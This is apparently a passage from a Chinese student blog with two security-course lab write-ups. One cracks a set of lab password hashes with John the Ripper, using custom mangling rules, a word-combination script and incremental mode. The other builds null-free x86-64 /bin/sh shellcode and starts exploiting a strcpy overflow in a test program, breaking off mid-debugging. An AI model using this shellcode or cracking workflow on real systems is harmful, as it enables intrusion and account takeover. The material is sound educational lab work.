可以看到，smile和admin这两个密码确实存在于password.lst中。然而，仅仅几千条记录的字典无法覆盖所有用户的密码，如果用户密码没有出现在字典中，但和其中的某条记录很接近，比如字典中存在hello，而用户的密码是hel1lo，我们该怎么继续利用字典来破解这一密码呢？这里就需要用到John提供的mangling rules了，我们可以设计这么一条规则：12345&gt;[1-9] i\0[a-zA-Z0-9]# &gt;[1-9]表示对于1-9中的任意一个数字，当输入单词的长度比它大时，执行之后的规则# i代表insert，后面跟两个参数，分别为插入位置与插入字符，比如iNX表示在N位置上插入一个字符X# \0即为插入位置，举个例子，如果输入单词长度为6，那么这里的\0表示[1-5]，如果输入单词长度为12，那么这里的\0表示[1-9]，所以\0可以理解为是规则&gt;[1-9]的满足范围# [a-zA-Z0-9]即为插入字符，比较容易理解，就是普通正则的用法，这里表示插入一个英文字母或数字。 为了将规则应用到破解中，我们需要修改john.conf文件，在[List.Rules:Wordlist]一节添加这条规则；当然也可以直接新建一个john.conf文件，只使用这一条规则，如下所示：1234567891011121314[Options]# Wordlist file name, to be used in batch modeWordlist = $JOHN/password.lst# Use idle cycles onlyIdle = Y# Crash recovery file saving delay in secondsSave = 600# Beep when a password is found (who needs this anyway?)Beep = N# "Single crack" mode rules[List.Rules:Wordlist]:&gt;[0-9] i\0[a-zA-Z0-9&amp;!@#$%^&amp;*=+.|?:"'_-] # 密码不一定是数字或字母，也有可能是特殊字符 我们再次尝试破解，这次我们需要加上--rules选项，表示我们需要将定义的规则应用在字典单词上：1234567891011121314151617181920212223242526272829~/Documents/*** ⌚ 11:17:11$ ./john --fork=6 --wordlist=password.lst --rules allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 7 password hashes with no different saltsNode numbers 1-6 of 6 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statusalphab6et (user7)2 0g 0:00:00:25 100% 0g/s 11697p/s 11697c/s 81879C/s butterfly]1..rastafari]an6 1g 0:00:00:25 100% 0.03920g/s 11480p/s 11480c/s 79715C/s jesuschri]stpassworld (user8)1 0g 0:00:00:26 100% 0g/s 11398p/s 11398c/s 79788C/s jesucrist]o..nightshad]eWaiting for 5 children to terminate5 0g 0:00:00:26 100% 0g/s 11170p/s 11170c/s 78193C/s instructo]r..newaccoun]t3 1g 0:00:00:26 100% 0.03707g/s 10933p/s 10933c/s 76150C/s mancheste]r..bestfrien]ds4 0g 0:00:00:27 100% 0g/s 10757p/s 10757c/s 75299C/s jethrotul]lSession completed~/Documents/*** ⌚ 11:18:12$ ./john --show allpasswduser1:user1user2:adminuser3:smileuser7:alphab6etuser8:passworld5 password hashes cracked, 5 left~/Documents/*** ⌚ 11:18:12$ 现在已经成功破解了5个密码。然后，根据实验提示，字典文件提供了很多单词，而密码可能是两个单词的组合，比如helloworld就是hello和world的组合。所以我们需要将字典文件里的单词两两组合，重新验证，不过John貌似没有规则能够让我们同时接收两个单词，并组合起来进行验证，所以这里需要用到脚本程序，自己重新构造一个具有单词组合的新字典文件。脚本程序如下所示：12345678910111213141516171819########################################################################## File Name: tran.sh# Author: Hac# Mail: hac@zju.edu.cn# Created Time: Fri 20 May 2016 11:33:08 AM CST##########################################################################!/bin/bashfile=$1while read a;do while read b; do c=$a$b if [ $&#123;#c&#125; -le 10 ] &amp;&amp; [ $&#123;#c&#125; -ge 3 ]; then # 过滤掉那些比较长或比较短的组合 echo "$a$b" &gt;&gt; newPasswd.lst fi done &lt; $filedone &lt; $file 这个程序应该不难理解，直接通过两层循环读取单词，做一个笛卡尔积。运行这个脚本，我们能够在原字典文件的基础上，构造出一个新的字典文件，其中的单词全部是两个基础单词的组合。基于这个新的字典文件，我们再尝试使用之前的规则进行破解：12345678910111213141516171819202122232425~/Documents/*** ⌚ 22:50:44$ ./john --fork=6 --wordlist=newPasswd.lst --rules allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 5 password hashes with no different saltsNode numbers 1-6 of 6 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statuslovecats (user6)password222 (user4)amy!password (user9)love&amp;pizza (user10)Session completed~/Documents/*** ⌚ 23:17:07$ ./john --show allpasswduser1:user1user2:adminuser3:smileuser4:password222user6:lovecatsuser7:alphab6etuser8:passworlduser9:amy!passworduser10:love&amp;pizza9 password hashes cracked, 1 left 这次破解会花费很长时间，主要是因为所使用的字典文件更大了。原来的字典文件只有3500多行，而我们将其中的单词两两组合(排除过长或过短的密码)后，新字典文件的行数达到了千万级别。花费了非常多的时间，我们的收获还是挺大的，这一次我们直接破解出了4个密码，分别是user4、user6、user9以及user10。现在，10个用户中只剩下user5的密码没有破解出来。 还剩下一个用户的密码没有破解。如果此时没有任何提示信息，那么我们就可以动用John的另一种非常强大的工作模式——Incremental。根据官方文档的说明，Incremental是John最强大的一种工作模式，因为它会尝试所有可能的字符组合，说白了就是真正的暴力破解。这种模式并没有尽头，因为字符组合有太多可能性，几乎不太可能在有限时间内穷举出所有字符组合。不过我们可以通过指定密码长度的范围，来减小字符组合的可能性，从而使得Incremental模式下的John能更快地破解出密码。 12345678910111213141516171819# john.conf# Incremental modes[Incremental:ASCII]File = $JOHN/ascii.chrMinLen = 4MaxLen = 8CharCount = 95[Incremental:LM_ASCII]File = $JOHN/lm_ascii.chrMinLen = 4MaxLen = 8CharCount = 69[Incremental:Digits]File = $JOHN/digits.chrMinLen = 4MaxLen = 8CharCount = 10 下面我们尝试使用Incremental模式对最后一个用户密码进行破解： 123456789101112131415161718192021222324252627282930~/Documents/*** ⌚ 23:21:20$ ./john --fork=6 --incremental allpasswdLoaded 10 password hashes with no different salts (md5crypt [MD5 32/64 X2])Remaining 1 password hashNode numbers 1-6 of 6 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statuspass2012 (user6)6 0g 0:00:01:00 0g/s 9890p/s 9890c/s 9890C/s lilachu..lilach13 0g 0:00:01:00 0g/s 9650p/s 9650c/s 9650C/s pops1c4..pops1c34 0g 0:00:01:00 0g/s 9681p/s 9681c/s 9681C/s 14015j..14014n2 0g 0:00:01:00 0g/s 10071p/s 10071c/s 10071C/s cattored..cattore15 0g 0:00:01:00 0g/s 9949p/s 9949c/s 9949C/s maydi15..maydi161 0g 0:00:01:00 0g/s 10252p/s 10252c/s 10252C/s chserz..chselyWaiting for 5 children to terminateSession aborted~/Documents*** ⌚ 23:22:48$ ./john --show allpasswduser1:user1user2:adminuser3:smileuser4:password222user5:pass2012user6:lovecatsuser7:alphab6etuser8:passworlduser9:amy!passworduser10:love&amp;pizza10 password hashes cracked, 0 left 如上所示，我们成功通过Incremental模式破解出了最后一个用户的密码。 Reference Lecture Homepage(仅学校内网可访问) John the Ripper官方文档(EXAMPLES和RULES两个章节非常重要)]]></content>
      <tags>
        <tag>Security</tag>
        <tag>Password</tag>
        <tag>John the Ripper</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Buffer Overflow实践]]></title>
    <url>%2F2016%2F05%2F11%2FBuffer-Overflow%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[上个世纪末，Buffer Overflow是黑客最常用的攻击手段之一，主要原因是当时操作系统以及各种函数库都不够完善，并没有实现对堆栈的保护，黑客可以随意地冲破缓冲区长度限制，直接修改函数返回地址，使程序跳到黑客所希望的地方，让它做一些奇奇怪怪的事，从而达到攻击的目的。这样的攻击方法就叫Return-Oriented Programming，简称ROP。常见的实现手段有两种，其一是黑客向栈中注入自己设计的代码，然后将函数返回地址改成注入代码的起始位置，因此当函数返回时，程序就开始执行这段注入代码了，所以黑客想干嘛就能让程序干嘛。这种攻击方式非常强大，但有一个致命缺陷，它要求栈是可执行的(executable)，一旦栈是不可执行的，那么函数返回后，程序就因为错误而被终止(我们可以通过在gcc编译时加选项设定栈是否可执行)。另一种方法就是专门针对不可执行栈的，黑客不再向栈中注入自己的执行代码，而是通过各种黑科技来找到程序中的gadget(具体方法参照MIT 6-858第三节课，也有现成工具可以实现)，gadget是一些指令片段，常见的就是ret和pop的组合，黑客的目的在于，找到很多个这样的gadget后，将它们链接在一起，形成gadget chain，也就是一段执行代码。。。总的来说，黑客在无法自己注入代码时，他可以东拼西凑找现有的代码，把它们当成零件组装成自己想要的程序代码。这种实现方式难度极大，就跟拼图一样，真的要耐住性子才能成功。 MIT 6-858这门课的第一个实验就是分析一个web服务器的存在的漏洞，并利用这些漏洞实现Buffer Overflow攻击，分别涉及到可执行栈与不可执行栈，最后再修复这些漏洞。不得不说，MIT的实验难度和本校的实验难度完全不是一个level的，我们的实验是一种跟着做的形式，最后也只是跑了一个shell出来，而MIT的实验几乎就是真实的hack。我至今还没有完成这次实验，主要是自己对汇编不是很熟悉，然后也耐不住性子连续花上几天时间来调试，有兴趣的同学可以去看一下，这是链接。实验要求使用虚拟机跑MIT提供的系统镜像，保证运行环境一致，这里建议大家使用Linux+kvm来做实验，非常方便。 下面介绍我对Buffer Overflow的实践，内容是本校「信息安全综合实验」课程第二、三次实验——通过注入代码，使一个正常的程序能够运行shell。 Start from here 总的来说，实验思路还是挺明了的，我们需要自己设计一段能运行shell的汇编代码，然后汇编成机器码，并注入到某个程序的堆栈中，最后修改ip寄存器，使程序执行我们注入的这段代码，从而跑出一个shell来。实验难度也不大，主要是要有耐心，毕竟本次实验涉及到大量的GDB调试操作，对GDB命令不熟悉的同学可能会吃些亏，因为调试过程会使用到一些较为复杂的命令参数。当然，只使用光秃秃的原始命令也是能够完成实验的，但会浪费一些时间。另外，实验环境为64位Linux系统，所以难度可能会稍微大一些，因为网上关于Buffer Overflow的实践教程全部都是基于32位系统的，我们只能靠自己来慢慢摸索。 Design Shell Code 我们第一个任务是设计一串能够执行shell的机器指令，但我们知道，不同机器有不同的指令集，不同系统对系统调用的处理也不一样，那该怎么保证我们最终注入的代码能够正常工作呢？ 答案很简单，我们直接找一个能在目的主机上运行的程序，仿照设计。如下所示即为我们的样例程序：123456789// sample.c#include &lt;stdio.h&gt;int main() &#123; char *array[2]; array[0] = "/bin/sh"; array[1] = NULL; execve(array[0], array, NULL); return 0;&#125; 这个程序通过execve函数产生系统调用，使进程执行shell。我们可以观察该程序编译得到的汇编代码，找到执行shell需要哪些关键步骤，然后自己重新组织，即可设计出一串能执行shell的机器指令。 这里使用gcc进行编译，注意添加两种重要选项，分别是-g与-static，分别代表生成调试信息、采用静态链接，这样可以方便我们进行调试。编译完成后，使用GDB查看二进制文件的机器指令，如下所示：123456789101112131415161718192021222324252627# main function │0x401164 &lt;main&gt; push %rbp # 保存旧的rbp，即caller的frame pointer │0x401165 &lt;main+1&gt; mov %rsp,%rbp # 获取新的rbp，即callee的frame pointer │0x401168 &lt;main+4&gt; sub $0x10,%rsp # 分配栈空间，两个指针需要占用16字节B+&gt;│0x40116c &lt;main+8&gt; movq $0x495d64,-0x10(%rbp) # array[0]赋值 │0x401174 &lt;main+16&gt; movq $0x0,-0x8(%rbp) # array[1]赋值 │0x40117c &lt;main+24&gt; mov -0x10(%rbp),%rax # 将array[0]赋给rax │0x401180 &lt;main+28&gt; lea -0x10(%rbp),%rcx # 将array，即array[0]的地址赋给rcx │0x401184 &lt;main+32&gt; mov $0x0,%edx # 将NULL赋给edx │0x401189 &lt;main+37&gt; mov %rcx,%rsi │0x40118c &lt;main+40&gt; mov %rax,%rdi │0x40118f &lt;main+43&gt; callq 0x40ef30 &lt;execve&gt; # 调用execve │0x401194 &lt;main+48&gt; mov $0x0,%eax # “return 0”中的0 │0x401199 &lt;main+53&gt; leaveq # 这里会将0x8(%rbp)赋给%rip，即恢复返回地址 │0x40119a &lt;main+54&gt; retq# execve function │0x40ef30 &lt;execve&gt; mov $0x3b,%eax # 将0x3b赋给%eax │0x40ef35 &lt;execve+5&gt; syscall # 系统调用，到此为止，之后的指令我们不用care │0x40ef37 &lt;execve+7&gt; cmp $0xfffffffffffff000,%rax │0x40ef3d &lt;execve+13&gt; ja 0x40ef41 &lt;execve+17&gt; │0x40ef3f &lt;execve+15&gt; repz retq │0x40ef41 &lt;execve+17&gt; mov $0xffffffffffffffc0,%rdx │0x40ef48 &lt;execve+24&gt; neg %eax │0x40ef4a &lt;execve+26&gt; mov %eax,%fs:(%rdx) │0x40ef4d &lt;execve+29&gt; or $0xffffffffffffffff,%rax │0x40ef51 &lt;execve+33&gt; retq 以上即为整个程序的汇编代码，大家按照注释对整个流程分析一遍以后，基本上就能总结出执行shell的几个必要条件了： 1. 内存中存在字符串/bin/sh，以\x00结束 2. 内存中存在一个8字节的区域存放字符串的地址，后面跟着一个8字节的0 3. 将以上16字节区域的起始地址存入%rsi中 4. 将字符串地址存入%rdi中 5. 将NULL存入%rdx中 6. 将0x3b存入%rax中(不用纠结%eax或者%rax) 7. 系统调用，syscall指令 此时，我们只需要针对以上需求，自己设计汇编代码即可。然而，现实总是很残酷，第1点需求估计就能难倒不少人，把字符串加载到内存不难，直接用.string即可，但是我们怎么获取该字符串的地址呢？莫非只能通过手工计算？那样该多麻烦呀！在这里我想了很久，最终想出的办法是直接往栈里写入/bin/sh，地址可以通过对%rsp加加减减获得，但这样的方法非常不优雅，一旦我们不再执行/bin/sh，想换为/usr/local/bin/zsh，那么我们的代码需要进行大幅度的修改。后来在Phrack上看到一个很tricky的办法，它很好的利用了call指令的特性，实现字符串地址的自动获取： 12345678# 非常妙的一种思路 jmp bbbaaa: do sth # 执行到这里时，%rsp所指向的8字节堆栈空间存放的就是"/bin/sh"的起始地址 ...bbb: call aaa # 执行这条指令时，会自动将下一条指令的地址压入堆栈 .string "/bin/sh" 这样一来，我们就解决了获取字符串地址的问题，接下来的几个需求都很容易实现，这里就不做具体介绍，直接贴出我设计的一段代码： 1234567891011121314151617# shell_1.smain: jmp bbbaaa: movq $0x0, %rax movq %rax, 0x8(%rsp) # array[1]赋值为NULL，对应第2点需求 movq 0x0(%rsp), %rdi # array[0]，即字符串地址，对应第4点需求 lea 0x0(%rsp), %rsi # array，对应第3点需求 movq $0x0, %rdx # NULL，对应第5点需求 movl $0x3b, %eax # 对应第6点需求 syscall # 对应第7点需求bbb: callq aaa .string "/bin/sh" # 对应第1点需求 .global main .type main, @function 使用gcc编译这段汇编代码，获得可执行文件，并运行： It works!!! 可以看到，程序执行之前我们使用的shell是bash，而在程序执行以后，我们使用的shell是/bin/sh，这说明我们的代码能够正常产生execve系统调用。 好，这样是不是就已经完成我们的第一部分工作——Design Shell Code了呢？当然并没有这么简单！我们来分析一下这个程序可能存在的问题。首先，如果execve系统调用失败了会如何？很简单，在执行完syscall指令以后，由于系统调用失败，程序并不会发生跳转，而是继续执行下一条指令，也就是callq aaa指令，显然这将导致死循环，最终导致程序崩溃。有兴趣的同学可以自己做一个小实验，把系统调用的三个参数修改一下，然后重新编译运行，我们会发现程序卡住一段时间，然后自动崩溃，并报错Segmentation fault (core dumped)。为了解决这一隐患，我们可以在原有的syscall指令后面再添加几条指令，调用exit，强行终止程序。这几条指令的设计和之前执行shell指令的设计原理类似，我们编写一个简单的C程序，其中调用exit(0)，然后将其编译得到可执行文件，观察exit这个系统调用需要哪些条件，我们再有针对性的为其设计指令即可： 12345// sample2.c#include &lt;stdlib.h&gt;int main() &#123; exit(0);&#125; 程序汇编指令如下所示：123456789101112131415161718192021222324252627282930313233343536373839404142434445# main function │0x401164 &lt;main&gt; push %rbp │0x401165 &lt;main+1&gt; mov %rsp,%rbpB+&gt;│0x401168 &lt;main+4&gt; mov $0x0,%edi │0x40116d &lt;main+9&gt; callq 0x401c00 &lt;exit&gt;# exit function │0x401c00 &lt;exit&gt; sub $0x8,%rsp │0x401c04 &lt;exit+4&gt; mov $0x1,%edx │0x401c09 &lt;exit+9&gt; mov $0x6c1080,%esi │0x401c0e &lt;exit+14&gt; callq 0x401b00 &lt;__run_exit_handlers&gt;# __run_exit_handlers function # ... 省略 │0x401bdd &lt;__run_exit_handlers+221&gt; add $0x8,%rbp │0x401be1 &lt;__run_exit_handlers+225&gt; cmp $0x4b3050,%rbp │0x401be8 &lt;__run_exit_handlers+232&gt; jb 0x401bda &lt;__run_exit_handlers+218&gt; │0x401bea &lt;__run_exit_handlers+234&gt; mov %ebx,%edi &gt;│0x401bec &lt;__run_exit_handlers+236&gt; callq 0x40eec0 &lt;_exit&gt; # ... 省略# _exit function │0x40eec0 &lt;_exit&gt; movslq %edi,%rdx │0x40eec3 &lt;_exit+3&gt; mov $0xffffffffffffffc0,%r9 │0x40eeca &lt;_exit+10&gt; mov $0xe7,%r8d │0x40eed0 &lt;_exit+16&gt; mov $0x3c,%esi │0x40eed5 &lt;_exit+21&gt; jmp 0x40eef0 &lt;_exit+48&gt; │0x40eed7 &lt;_exit+23&gt; nopw 0x0(%rax,%rax,1) │0x40eee0 &lt;_exit+32&gt; mov %rdx,%rdi │0x40eee3 &lt;_exit+35&gt; mov %esi,%eax │0x40eee5 &lt;_exit+37&gt; syscall │0x40eee7 &lt;_exit+39&gt; cmp $0xfffffffffffff000,%rax │0x40eeed &lt;_exit+45&gt; ja 0x40ef08 &lt;_exit+72&gt; │0x40eeef &lt;_exit+47&gt; hlt │0x40eef0 &lt;_exit+48&gt; mov %rdx,%rdi │0x40eef3 &lt;_exit+51&gt; mov %r8d,%eax &gt;│0x40eef6 &lt;_exit+54&gt; syscall │0x40eef8 &lt;_exit+56&gt; cmp $0xfffffffffffff000,%rax │0x40eefe &lt;_exit+62&gt; jbe 0x40eee0 &lt;_exit+32&gt; │0x40ef00 &lt;_exit+64&gt; neg %eax │0x40ef02 &lt;_exit+66&gt; mov %eax,%fs:(%r9) │0x40ef06 &lt;_exit+70&gt; jmp 0x40eee0 &lt;_exit+32&gt; │0x40ef08 &lt;_exit+72&gt; neg %eax │0x40ef0a &lt;_exit+74&gt; mov %eax,%fs:(%r9) │0x40ef0e &lt;_exit+78&gt; jmp 0x40eeef &lt;_exit+47&gt; 不得不说，分析exit的汇编指令比分析execve要难得多，因为这里面涉及到了3层调用，尤其是__run_exit_handlers，看着就头痛。更悲剧的是，由于syscall前面有近百条汇编指令，系统调用的参数可能在之前某一条指令中就已经存入寄存器了，如果要分析出该系统调用具体有哪些必需参数，貌似我们只能把每一条指令都弄明白。不过程序员可不是苦力，怎么能干这种吃力不讨好的事呢？肯定有投机取巧的方法！ 不同于32位机的堆栈传递参数，对于64位机，我们知道，函数调用的参数是通过寄存器传递的，而常用的寄存器就那么几个，分别是%rdi、%rsi、%rdx、%rax，因此，我们完全可以在执行syscall指令前把这几个寄存器的值全部抓下来，不管是不是真正的参数，总之我在使用的时候就按这个进行赋值，这样总能执行成功吧！话不多说，立马实践，使用GDB跟踪程序到syscall指令，然后查看四个参数寄存器的值： 这样，我们也就获得了调用exit的几个必要条件： 1. 将0xe7存入%rax(实际上是%eax)中 2. 将0x0存入%rdx中 3. 将0x0存入%rdi中 4. 将0x3c分别存入%rsi中 5. 系统调用，syscall指令 根据以上需求，我们可以设计出能够产生exit系统调用的代码段： 12345678910# exit.smain: movl $0xe7, %eax # 对应第1点需求 movq $0x0, %rdx # 对应第2点需求 movq $0x0, %rdi # 对应第3点需求 movq $0x3c, %rsi # 对应第4点需求 syscall # 对应第5点需求 .global main .type main, @function 使用gcc将这段代码汇编成可执行文件，然后使用GDB跟踪调试，发现执行完syscall指令后，该进程正常退出，这表明我们设计的代码能够正常产生exit系统调用。1234(gdb) ni[Inferior 1 (process 764) exited normally]warning: Error removing breakpoint -9(gdb) 不过，经过测试(其实就是依次修改各个参数寄存器的值，查看程序能否正常退出)，我们会发现，列出的5点需求中，只有第1、3、5点需求是必要的，其余两点需求可以忽略，因此，我们的代码可以继续精简两行，直接把movq $0x0, %rdx和movq $0x3c, %rsi删掉即可。 至此，我们可以将两串代码拼接在一起：1234567891011121314151617181920# shell_2.smain: jmp bbbaaa: movq $0x0, %rax movq %rax, 0x8(%rsp) movq 0x0(%rsp), %rdi lea 0x0(%rsp), %rsi movq $0x0, %rdx movl $0x3b, %eax syscall movl $0xe7, %eax movq $0x0, %rdi syscallbbb: callq aaa .string "/bin/sh" .global main .type main, @function 这个程序不仅能够产生execve系统调用，执行shell，还能在execve系统调用失败时正常退出，以免发生错误。理论上来说，这段代码已经基本满足我们对shell code的功能需求，然而，它却无法使用。为了说明这一点，我们可以查看一下这些指令对应的机器码： 123456789101112131415161718192021223130104006@hamsa:~/project2$ objdump -d shell_2 | grep -A20 '&lt;main&gt;'0000000000401164 &lt;main&gt;: 401164: eb 30 jmp 401196 &lt;bbb&gt;0000000000401166 &lt;aaa&gt;: 401166: 48 c7 c0 00 00 00 00 mov $0x0,%rax 40116d: 48 89 44 24 08 mov %rax,0x8(%rsp) 401172: 48 8b 3c 24 mov (%rsp),%rdi 401176: 48 8d 34 24 lea (%rsp),%rsi 40117a: 48 c7 c2 00 00 00 00 mov $0x0,%rdx 401181: b8 3b 00 00 00 mov $0x3b,%eax 401186: 0f 05 syscall 401188: b8 e7 00 00 00 mov $0xe7,%eax 40118d: 48 c7 c7 00 00 00 00 mov $0x0,%rdi 401194: 0f 05 syscall0000000000401196 &lt;bbb&gt;: 401196: e8 cb ff ff ff callq 401166 &lt;aaa&gt; 40119b: 2f (bad) 40119c: 62 (bad) 40119d: 69 6e 2f 73 68 00 90 imul $0x90006873,0x2f(%rsi),%ebp 4011a4: 90 nop 注意到，我们设计的汇编代码在翻译成机器指令后，出现了大量的\x00字段，这在代码注入环节是不可接受的！因为buffer overflow的攻击目标是那些使用了批量写内存操作的程序，比如常见的gets()、strcpy函数，这些函数一般具有同一个特征——没有指定向内存中写多少字节。举个例子，对于字符串拷贝函数strcpy，它以字节为单位，从源地址读取数据，向目的地址写入数据，然后源地址和目的地址同时递增，继续下一次拷贝，直至遇到\x00时终止操作，因为这是字符串的结束标记。由此可见，假设我们利用strcpy函数将之前设计的机器码注入到内存，那么仅有第一个\x00前面的内容(这里即\xeb\x29\x48\xc7\c0)能够注入，后面的内容都将被忽略，这显然是一次失败的攻击。 为了解决这一缺陷，我们需要人为地消除\x00。幸运的是，我们的攻击目标是一台x86的机器，CISC架构使得它的指令长度是不固定的，从而能够获得非常高的指令密度，我们利用这一特性，可以对设计的指令做一些小的修改，消除\x00的存在。具体如下所示：123movq $0x0,%rax ----&gt; xor %rax,%raxmovq $0x0,%rdx ----&gt; xor %rdx,%rdxmovl $0x3b,%eax ----&gt; movb $0x3b,%al 其实原理很简单，无非就是消除立即数中的\x00字段，这可以通过使用其他指令或者分割立即数来实现。 最终我们得到的无\x00版汇编代码如下所示：123456789101112131415161718192021# shell_3.smain: jmp bbbaaa: xor %rax, %rax movq %rax, 0x8(%rsp) movq 0x0(%rsp), %rdi lea 0x0(%rsp), %rsi xor %rdx, %rdx movb $0x3b, %al syscall xor %rax, %rax movb $0xe7, %al xor %rdi, %rdi syscallbbb: callq aaa .string "/bin/sh" .global main .type main, @function 对应机器码如下所示，可以看到代码部分已经不存在\x00字段了：123456789101112131415161718192021223130104006@hamsa:~/project2$ objdump -d shell_3 | grep -A20 '&lt;main&gt;'0000000000401164 &lt;main&gt;: 401164: eb 21 jmp 401187 &lt;bbb&gt;0000000000401166 &lt;aaa&gt;: 401166: 48 31 c0 xor %rax,%rax 401169: 48 89 44 24 08 mov %rax,0x8(%rsp) 40116e: 48 8b 3c 24 mov (%rsp),%rdi 401172: 48 8d 34 24 lea (%rsp),%rsi 401176: 48 31 d2 xor %rdx,%rdx 401179: b0 3b mov $0x3b,%al 40117b: 0f 05 syscall 40117d: 48 31 c0 xor %rax,%rax 401180: b0 e7 mov $0xe7,%al 401182: 48 31 ff xor %rdi,%rdi 401185: 0f 05 syscall0000000000401187 &lt;bbb&gt;: 401187: e8 da ff ff ff callq 401166 &lt;aaa&gt; 40118c: 2f (bad) 40118d: 62 (bad) 40118e: 69 6e 2f 73 68 00 90 imul $0x90006873,0x2f(%rsi),%ebp 需要注意的是，不只是\x00，在某些场景下，\x0A、\x0D、\x20以及\x08这些特殊字符也会影响到代码的注入，这个就要具体问题具体分析了，不能一概而论，总之，大家可以暂时忽略这些隐患，而在真正注入代码时，观察能否注入成功，如果不能，再根据具体原因来修改代码，千万不要空想代码可能存在哪些bug。 我最初做到这里的时候，就直接开始做下一步工作了，但事实上这段代码还存在一个问题，虽然现在单独使用并没有任何影响，但在真正注入时会使得攻击失效。为了方便，我直接在这里提出来，其实就是字符串末尾必须填入一个\x00，否则传入execve的参数不再是/bin/sh字符串，而是/bin/sh***，这样会导致系统调用失败；同时，又考虑到\x00会终止整个的代码的注入，所以我们不能简单地补上一个\x00。这时我们该怎么做呢？答案其实也不难，直接在代码里对字符串末尾的字节进行修改，赋值为0就好了嘛！所以，最终我们将使用的shell code是这样的： 1234567891011121314151617181920main: jmp bbbaaa: xor %rax, %rax movq %rax, 0x8(%rsp) movq 0x0(%rsp), %rdi movb %al, 0x7(%rdi) # %rdi为字符串起始地址，这里就是将第8个字符赋值为0 lea 0x0(%rsp), %rsi movb $0x3b, %al syscall xor %rax, %rax movb $0xe7, %al xor %rdi, %rdi syscallbbb: callq aaa .string "/bin/sh" .global main .type main, @function 需要注意的是，不同于前面几版的shell code，最终版的程序是无法单独运行的，因为指令movb %al, 0x7(%rdi)有对代码段(code section，只读区域)进行修改，这是不被允许的，所以程序在执行到这条指令时，会产生错误Segmentation fault (core dumped)。但不用担心，当我们将这段代码注入到目标程序以后，它又是可以运行的了！因为我们是将代码注入到目标程序的栈中，我们知道栈空间的数据是可以修改的，不像代码段那样只可读不可写。 不过为了证明最终的代码可以工作，我们还是能设计一个简单的测试程序来验证的：123456789101112// test_final.cchar shellcode[] = "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh";// 汇编代码翻译后得到的机器码void shell() &#123; long long *ret; ret = (long long *)&amp;ret + 0x2; // 这一步有些tricky，其实作用就是使ret指向函数返回地址 *ret = (long long)shellcode; // 有了上一步，这里我们就可以修改返回地址，使程序跳转到shellcode&#125;int main() &#123; shell(); return 0;&#125; 这里稍微解释一下程序中最为关键的一步：ret = (long long *)&amp;ret + 0x2;。参照我的另一篇博文Buffer Overflow(理论篇)，在程序执行过程中，栈的结构是这样的：12345678910111213# stack +----------------+entry %rbp ----&gt; |.. prev frame ..| | | | | +----------------+entry %rsp ----&gt; | return address | # 我们要修改的是这个位置 +----------------+new %rbp ----&gt; | saved %rbp | +----------------+ | Local | # &lt;------ ret指针就在这里new %rsp ----&gt; | Variables | +----------------+ 对于64位系统，return address、saved %rbp以及long long *所占用的空间都是8字节，因此，return address的地址要比ret的地址大16个字节，也就是2个long long *的长度！这么一说，想必大家都已经明白ret = (long long *)&amp;ret + 0x2的原理了，它最终会使得ret指向函数返回地址，从而我们能够通过修改*ret来实现对返回地址的修改。 最终测试程序运行如下所示： 至此，第一部分工作正式完成，我们已经为buffer overflow攻击打下了很好的基础，下面就是真正的实践了。 Exploit Buffer Overflow with GDB 我们已经完成恶意代码的设计，下面我们开始尝试将代码注入到一个很weak的程序中，使它能够按照我们的意愿来工作(其实就是执行shell啦)。目标程序代码如下所示： 123456789101112// victim.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;void foo(char *arg) &#123; char buffer[64]; strcpy(buffer, arg);&#125;int main(int argc, char *argv[]) &#123; foo(argv[1]); return(0);&#125; 1234567# 编译目标代码3130104006@hamsa:~/project3$ gcc victim.c -g -Wall -fno-stack-protector -z execstack -static -o victim# -g 表示生成调试信息，方便使用GDB调试# -Wall 表示打开警告开关，提示所有warning信息# -fno-stack-protector 表示禁用栈保护机制，如果没有这个选项，本次实验无法完成。这里的栈保护机制其实就是canary# -z execstack 表示允许栈可执行，没有这个选项，本次实验也无法完成# -static 表示静态链接 为什么说这个程序很weak呢？这里用过Visual Studio的同学一定很有感受，如果我们的工程里有使用gets、strcpy这样的函数，那么编译时IDE一定会抱怨这些函数是dangerous的，蛋疼的是，它报的不是warning，而是error，这样也就导致工程无法编译。我们的目标程序刚好使用到了strcpy函数，这让我们有可趁之机，因为该函数并没有做边界限制，理论上来说，只要不遇到终止符\x00，它就会一直进行内存拷贝，我们利用这一特性，可以输入一串很长的数据，然后通过strcpy拷贝到本地变量buffer中，但由于我们输入的数据长度要超过buffer的长度，甚至还会覆盖到foo函数的返回地址字段，所以我们还能利用输入的数据将函数返回地址修改掉，使程序返回时跳到我们规定的位置(一般是注入代码的起始地址，也就是buffer的地址)，执行我们注入的代码，这就是buffer overflow攻击的一种实现原理。 根据实验原理，为了实现攻击，除了需要一段恶意代码之外，我们还需要知道这段恶意代码注入到内存中后的起始地址，如此才能正确覆写程序返回地址。这里，我们可以使用GDB来跟踪程序的运行，查看程序进入foo函数后，buffer的起始地址是多少。123456789101112131415161718# Debug victim program with GDB ┌─────────────────────────────────────────────────────────────────────────┐ │0x401164 &lt;foo&gt; push %rbp │ │0x401165 &lt;foo+1&gt; mov %rsp,%rbp │ │0x401168 &lt;foo+4&gt; sub $0x50,%rsp │ │0x40116c &lt;foo+8&gt; mov %rdi,-0x48(%rbp) │ │0x401170 &lt;foo+12&gt; mov -0x48(%rbp),%rdx # 将argv[1]的地址赋给%rdx│ │0x401174 &lt;foo+16&gt; lea -0x40(%rbp),%rax # 将buffer的地址赋给%rax │ &gt;│0x401178 &lt;foo+20&gt; mov %rdx,%rsi # 程序暂时停在这个位置 │ │0x40117b &lt;foo+23&gt; mov %rax,%rdi │ │0x40117e &lt;foo+26&gt; callq 0x400320 # strcpy函数调用 │ │0x401183 &lt;foo+31&gt; leaveq │ │0x401184 &lt;foo+32&gt; retq │ └─────────────────────────────────────────────────────────────────────────┘child process 17315 In: foo Line: 6 PC: 